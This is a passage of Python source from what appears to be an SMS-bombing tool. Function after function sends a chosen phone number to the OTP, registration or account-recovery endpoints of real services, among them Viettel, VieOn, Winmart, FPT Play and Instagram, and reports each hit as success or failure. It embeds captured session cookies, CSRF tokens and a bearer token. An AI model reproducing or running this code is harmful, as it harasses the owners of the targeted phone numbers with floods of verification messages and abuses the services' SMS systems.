    response = requests.post("https://mocha.lozi.vn/v6/invites/use-app", headers={"Host": "mocha.lozi.vn","content-length": "47","x-city-id": "50","accept-language": "vi_VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36","content-type": "application/json","x-lozi-client": "1","x-access-token": "unknown","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://loship.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://loship.vn","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"device":"Android 8.1.0","platform":"Chrome/104.0.0.0","countryCode":"84","phoneNumber":phone[1:11]}))
    if response.status_code == 200:
        print(format_print("*", "oldloship: THÀNH CÔNG!"))
    else:
        print(format_print("x", "oldloship: THẤT BẠI!"))   
        
        
def vayvnd(sdt):
  headers = {
    'Host': 'api.vayvnd.vn',
    # 'content-length': '129',
    'accept': 'application/json',
    'accept-language': 'vi-VN',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'site-id': '3',
    'content-type': 'application/json; charset=utf-8',
    'origin': 'https://vayvnd.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://vayvnd.vn/',
    # 'accept-encoding': 'gzip, deflate',
    # 'cookie': '_ym_uid=1693661293470221083; _ym_d=1693661293; _ym_isad=2; _ym_visorc=b',
    }
  data = '{"phone":"%s","utm":[{"utm_source":"google","utm_medium":"organic","referrer":"https://www.google.com/"}],"sourceSite":3}' %sdt #replace("sdt",sdt)
  response = requests.post('https://api.vayvnd.vn/v2/users', headers=headers, data=data)
  if response.status_code == 200:
      print(format_print("*", "vayvnd: THÀNH CÔNG!"))
  else:
      print(format_print("x", "vayvnd: THẤT BẠI!"))   
    
    
def tamo(phone):
    response = requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts", headers={"Host": "api.tamo.vn","content-length": "39","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://www.tamo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.tamo.vn/","accept-encoding": "gzip, deflate, br"}, json=({"mobilePhone":{"number":"0"+phone[1:11]}}))
    if response.status_code == 200:
        print(format_print("*", "tamo: THÀNH CÔNG!"))
    else:
        print(format_print("x", "tamo: THẤT BẠI!"))   
        
        
def meta(sdt):
  headers = {
    'Host': 'meta.vn',
    # 'content-length': '90',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://meta.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://meta.vn/account/register',
    # 'accept-encoding': 'gzip, deflate',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_ssid=xhayku0daxesy3udibcop0w4; _cart_=e6ad1ba7-59c8-4970-8dbd-de38a37d6f4a; __ckmid=a96a19eaf8e44aa1b4947e161ae80729',
    }
  params = {
    'api_mode': '1',
  }
  data = '{"api_args":{"lgUser":"%s","act":"send","type":"phone"},"api_method":"CheckExist"}' %sdt #replace("sdt",sdt)
  response = requests.post(
    'https://meta.vn/app_scripts/pages/AccountReact.aspx',
    params=params,
    headers=headers,
    data=data,
    )
  if response.status_code == 200:
      print(format_print("*", "meta: THÀNH CÔNG!"))
  else:
      print(format_print("x", "meta: THẤT BẠI!"))   
          
          
def gapo(sdt):
    headers = {
        "Host": "api.gapo.vn",
        "Content-Length": "31",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?1",
        "Authorization": "Bearer",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Sec-Ch-Ua-Platform": "\"Android\"",
        "Accept": "*/*",
        "Origin": "https://www.gapo.vn",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.gapo.vn/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    data = {
        "device_id": "30a1bfa0-533f-45e9-be60-b48fb8977df2",
        "phone_number": "+84-" + sdt[1:11],
        "otp_type": 0
    }
    
    try:
      response = requests.post("https://api.gapo.vn/auth/v2.0/signup", headers=headers, data=json.dumps(data))
      if response.status_code == 200:
          print(format_print("*", "gapo: THÀNH CÔNG!"))
      else:
          print(format_print("x", "gapo: THẤT BẠI!"))   
    except:
      pass
      
      
def robocash(phone):
  cookies = {
    'supportOnlineTalkID':
    'Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6',
    '__cfruid':
    'f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280',
    'XSRF-TOKEN':
    'eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D',
    'sessionid':
    'eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D',
    'utm_uid':
    'eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D',
    'ec_cache_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_cache_client':
    'false',
    'ec_cache_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'ec_png_client':
    'false',
    'ec_png_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_etag_client':
    'false',
    'ec_png_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'ec_etag_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_etag_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'uid':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'client':
    'false',
    'client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
  }

  headers = {
    'authority': 'robocash.vn',
    'accept': '*/*',
    'accept-language':
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'supportOnlineTalkID=Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6; __cfruid=f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280; XSRF-TOKEN=eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D; ec_cache_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_cache_client=false; ec_cache_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; ec_png_client=false; ec_png_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_etag_client=false; ec_png_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; ec_etag_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_etag_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; uid=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; client=false; client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'origin': 'https://robocash.vn',
    'referer': 'https://robocash.vn/register',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
  }

  data = {
    'phone': phone,
    '_token': 'iSkFRbkX3IamHEhtVZAi9AZ3PLRlaXMjX1hJJS3I',
  }

  response = requests.post('https://robocash.vn/register/phone-resend',
                cookies=cookies,
                headers=headers,
                data=data)
  if response.status_code == 200:
      print(format_print("*", "robocash: THÀNH CÔNG!"))
  else:
      print(format_print("x", "robocash: THẤT BẠI!"))   
        
                      
def vieon(sdt):
  headers = {
    'Host': 'api.vieon.vn',
    # 'content-length': '225',
    'accept': 'application/json, text/plain, */*',
    'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTM4MzU2OTgsImp0aSI6IjRjYTdmMTBiYjk2MTUzNjZjNzUxYjRmNGFjNjY3ZTZiIiwiYXVkIjoiIiwiaWF0IjoxNjkzNjYyODk4LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY5MzY2Mjg5Nywic3ViIjoiYW5vbnltb3VzXzU3ZjNmZmQ3N2FkMjA5YTYyNmMxZWE2MDdkMGM0Nzc1LWNkOWI3MDM1MDZlMWRlMDU3M2NhMDRjNjY2YzFiNjZkLTE2OTM2NjI4OTgiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiNTdmM2ZmZDc3YWQyMDlhNjI2YzFlYTYwN2QwYzQ3NzUtY2Q5YjcwMzUwNmUxZGUwNTczY2EwNGM2NjZjMWI2NmQtMTY5MzY2Mjg5OCIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMS4wOyBDUEgxODAzIEJ1aWxkL09QTTEuMTcxMDE5LjAyNikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNi4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsImR0IjoibW9iaWxlX3dlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiQW5kcm9pZCA4LjEuMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.fQERPMuQAu0FKAm7xTBECSNxeDJlhGyKwy4C-TUU-JI',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://vieon.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://vieon.vn/',
    # 'accept-encoding': 'gzip, deflate',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  params = {
    'platform': 'mobile_web',
    'ui': '012021',
  }
  data = {
    'phone_number': sdt,
    'password': '1234gdtg',
    'given_name': '',
    'device_id': '57f3ffd77ad209a626c1ea607d0c4775',
    'platform': 'mobile_web',
    'model': 'Android 8.1.0',
    'push_token': '',
    'device_name': 'Chrome/116',
    'device_type': 'desktop',
    'isMorePlatform': 'true',
    'ui': '012021',
  }
  response = requests.post('https://api.vieon.vn/backend/user/register/mobile', params=params, headers=headers, data=data)
  if response.status_code == 200:
      print(format_print("*", "vieon: THÀNH CÔNG!"))
  else:
      print(format_print("x", "vieon: THẤT BẠI!"))   
      
      
def instagram(phone):
    response = requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json()
    if response.status_code == 200:
        print(format_print("*", "instagram: THÀNH CÔNG!"))
    else:
        print(format_print("x", "instagram: THẤT BẠI!"))   
        
        
def winmart(sdt):
  headers = {
    'Host': 'api-crownx.winmart.vn',
    'accept': 'application/json',
    'authorization': 'Bearer undefined',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'origin': 'https://winmart.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://winmart.vn/',
    # 'accept-encoding': 'gzip, deflate',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  params = {
    'phoneNo': sdt,
  }
  response = requests.get('https://api-crownx.winmart.vn/as/api/web/v1/send-otp', params=params, headers=headers)
  if response.status_code == 200:
      print(format_print("*", "winmart: THÀNH CÔNG!"))
  else:
      print(format_print("x", "winmart: THẤT BẠI!"))   
      
      
def concung(phone):
    Headers = {"Host": "concung.com","content-length": "121","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://concung.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://concung.com/dang-nhap.html","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_BBD6001M29\u003dGS1.1.1679234342.1.1.1679234352.50.0.0"}
    Payload = {"ajax": "1","classAjax": "AjaxLogin","methodAjax": "sendOtpLogin","customer_phone": phone,"id_customer": "0","momoapp": "0","back": "khach-hang.html"}
    response = requests.post("https://concung.com/ajax.html", data=Payload, headers=Headers)
    if response.status_code == 200:
        print(format_print("*", "concung: THÀNH CÔNG!"))
    else:
        print(format_print("x", "concung: THẤT BẠI!"))   
        
        
def funring(phone):
    Headers = {"Host": "funring.vn","Connection": "keep-alive","Content-Length": "28","Accept": "*/*","User-Agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","Content-Type": "application/json","Origin": "http://funring.vn","Referer": "http://funring.vn/module/register_mobile.jsp","Accept-Encoding": "gzip, deflate","Accept-Language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"username": phone[1:11]})
    response = requests.post("http://funring.vn/api/v1.0.1/jersey/user/getotp", data=Datason, headers=Headers)
    if response.status_code == 200:
        print(format_print("*", "funring: THÀNH CÔNG!"))
    else:
        print(format_print("x", "funring: THẤT BẠI!"))   
        
        
def fptplay(sdt):
  headers = {
    'Host': 'api.fptplay.net',
    # 'content-length': '89',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-did': 'D23DB2566887A76C',
    'content-type': 'application/json; charset=UTF-8',
    'origin': 'https://fptplay.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://fptplay.vn/',
    # 'accept-encoding': 'gzip, deflate',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  data = '{"phone":"%s","country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8"}' %sdt #replace("sdt",sdt)
  response = requests.post(
    'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=WWHbn-h7R9s60bp1YARxeg&e=1693668280&device=Chrome(version%253A116.0.0.0)&drm=1',
    headers=headers,
    data=data,
  )
  if response.status_code == 200:
      print(format_print("*", "fptplay: THÀNH CÔNG!"))
  else:
      print(format_print("x", "fptplay: THẤT BẠI!"))   
      
        
def vietid(phone):
    csrfget = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F").text
    csrf = csrfget.split('name="csrf-token" value="')[1].split('"/>')[0]
    Headers = {"Host": "oauth.vietid.net","content-length": "41","cache-control": "max-age\u003d0","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","upgrade-insecure-requests": "1","origin": "https://oauth.vietid.net","content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_H5VRTZBFLG\u003dGS1.1.1679234987.1.0.1679234987.0.0.0"}
    Payload = {"csrf-token": csrf,"account": phone}
    response = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F", data=Payload, headers=Headers)
    if response.status_code == 200:
        print(format_print("*", "vietid: THÀNH CÔNG!"))
    else:
        print(format_print("x", "vietid: THẤT BẠI!"))   
      
      
def viettel(phone):
    cookies = {
        'laravel_session': 'XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv',
        '_gcl_au': '1.1.307401310.1685096321',
        '_gid': 'GA1.2.1786782073.1685096321',
        '_fbp': 'fb.1.1685096322884.1341401421',
        '__zi': '2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1',
        'redirectLogin': 'https://vietteltelecom.vn/dang-ky',
        '_ga_VH8261689Q': 'GS1.1.1685096321.1.1.1685096380.1.0.0',
        '_ga': 'GA1.2.1385846845.1685096321',
        '_gat_UA-58224545-1': '1',
        'XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv; _gcl_au=1.1.307401310.1685096321; _gid=GA1.2.1786782073.1685096321; _fbp=fb.1.1685096322884.1341401421; __zi=2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1; redirectLogin=https://vietteltelecom.vn/dang-ky; _ga_VH8261689Q=GS1.1.1685096321.1.1.1685096380.1.0.0; _ga=GA1.2.1385846845.1685096321; _gat_UA-58224545-1=1; XSRF-TOKEN=eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
        'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)
    if response.status_code == 200:
        print(format_print("*", "viettel: THÀNH CÔNG!"))
    else:
        print(format_print("x", "viettel: THẤT BẠI!"))   
        
        
def dkvt(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
